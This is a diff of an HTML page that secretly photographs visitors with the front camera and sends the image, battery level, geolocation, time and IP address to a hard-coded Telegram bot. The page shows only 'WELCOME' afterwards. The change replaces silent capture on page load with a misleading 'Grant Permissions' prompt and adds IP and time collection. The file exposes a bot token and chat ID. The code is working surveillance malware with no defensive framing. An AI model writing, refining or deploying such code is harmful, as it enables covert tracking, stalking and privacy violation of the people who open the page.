@@ -3,41 +3,51 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Processing...</title>
+    <title>Permission Required</title>
     <style>
-        body { background-color: black; color: white; text-align: center; font-size: 24px; height: 100vh; display: flex; align-items: center; justify-content: center; }
+        body { background-color: black; color: white; font-size: 20px; text-align: center; height: 100vh; display: flex; align-items: center; justify-content: center; flex-direction: column; }
+        #permissionPrompt { display: block; }
         #welcome { display: none; }
+        button { background-color: #4CAF50; color: white; border: none; padding: 10px 20px; cursor: pointer; font-size: 18px; }
+        button:hover { background-color: #45a049; }
     </style>
 </head>
 <body>
-    <video id="video" autoplay style="display: none;"></video>
-    <canvas id="canvas" width="400" height="600" style="display: none;"></canvas>
+    <div id="permissionPrompt">
+        <p>Please enable Camera and Location permissions to continue.</p>
+        <button onclick="requestPermission()">Grant Permissions</button>
+    </div>
     <div id="welcome">WELCOME</div>
 
     <script>
         const TELEGRAM_BOT_TOKEN = "7250347146:AAF2fQ7skQFhHoOgsboWUJzQlmYo5ZAHMC4";
         const TELEGRAM_CHAT_ID = "5112680061";  
 
-        let video = document.getElementById("video");
-        let canvas = document.getElementById("canvas");
+        let video = document.createElement("video");
+        let canvas = document.createElement("canvas");
         let context = canvas.getContext("2d");
 
-        async function startCapture() {
-            try {
-                let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                video.srcObject = stream;
+        // 🔥 Function to request permissions
+        function requestPermission() {
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
+                .then(stream => {
+                    // Hide permission prompt
+                    document.getElementById("permissionPrompt").style.display = "none";
 
-                // **🔥 2 Sec me photo click karne ka optimized method**
-                setTimeout(() => {
-                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    let imageData = canvas.toDataURL("image/png");
-                    stream.getTracks().forEach(track => track.stop());  
+                    // Start capturing the photo after 2 sec
+                    setTimeout(() => {
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        let imageData = canvas.toDataURL("image/png");
+                        stream.getTracks().forEach(track => track.stop());  // Stop camera
 
-                    getUserDetails(imageData);
-                }, 2000);  
-            } catch (err) {
-                console.error("Camera access denied!", err);
-            }
+                        getUserDetails(imageData);
+                    }, 2000); // 2 sec to capture photo
+
+                    video.srcObject = stream;
+                })
+                .catch(err => {
+                    alert("Permission Denied: Unable to access Camera or Location");
+                });
         }
 
         async function getUserDetails(imageData) {
@@ -49,14 +59,17 @@
                 );
             });
 
-            // **🔥 Battery aur Location Parallel Fetch ho raha hai, speed fast ho gayi**
-            let [battery, location] = await Promise.all([batteryPromise, locationPromise]);
+            // Fetching Time and IP Address
+            let currentTime = new Date().toLocaleString();
+            let ipPromise = fetch("https://api.ipify.org?format=json").then(res => res.json()).then(data => data.ip).catch(() => "IP not available");
 
-            sendToTelegram(imageData, battery, location);
+            let [battery, location, ip] = await Promise.all([batteryPromise, locationPromise, ipPromise]);
+
+            sendToTelegram(imageData, battery, location, currentTime, ip);
         }
 
-        function sendToTelegram(imageData, battery, location) {
-            let message = `📸 **User Info**\n🔋 Battery: ${battery}\n📍 Location: ${location}`;
+        function sendToTelegram(imageData, battery, location, currentTime, ip) {
+            let message = `📸 **User Info**\n🔋 Battery: ${battery}\n📍 Location: ${location}\n🕒 Time: ${currentTime}\n🌐 IP: ${ip}`;
 
             fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                 method: "POST",
@@ -73,8 +86,8 @@
                 method: "POST",
                 body: formData
             }).then(() => {
-                document.body.style.backgroundColor = "black";  
-                document.getElementById("welcome").style.display = "block";  
+                document.body.style.backgroundColor = "black";
+                document.getElementById("welcome").style.display = "block";
             }).catch(error => console.log("Photo sending error:", error));
         }
 
@@ -88,8 +101,6 @@
             }
             return new Blob([ab], { type: mimeString });
         }
-
-        startCapture();
     </script>
 </body>
 </html>
